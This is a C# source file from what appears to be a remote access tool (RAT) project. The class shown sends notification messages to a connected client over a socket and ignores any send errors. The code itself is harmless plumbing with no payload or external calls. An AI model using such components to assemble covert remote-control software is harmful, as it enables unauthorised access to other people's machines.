using RAT.src.Interfaces;
using System;
using System.Text;

namespace RAT.src.Logic.Notifications
{
    /// <summary>
    /// Logic for sending notification messages to client.
    /// </summary>
    public class ClientNotificationLogic : IClientNotificationLogic
    {
        private readonly ISocketStateLogic _stateLogic;

        /// <summary>
        /// Logic for sending notification messages to client.
        /// </summary>
        /// <param name="stateLogic">Our client state.</param>
        public ClientNotificationLogic(ISocketStateLogic stateLogic)
        {
            _stateLogic = stateLogic;
        }

        /// <summary>
        /// Notifies client with specified message, uses main client socket for notifications.
        /// </summary>
        /// <param name="message">Message to send to client.</param>
        public void NotifyClient(string message)
        {
            var clientSocket = _stateLogic.State.ClientSocket;
            if (clientSocket == null || !clientSocket.Connected)
            {
                return;
            }

            try
            {
                clientSocket.Send(Encoding.ASCII.GetBytes(message), 0, message.Length, 0);
            }
            catch (Exception) { } // Can't do anything here.
        }
    }
}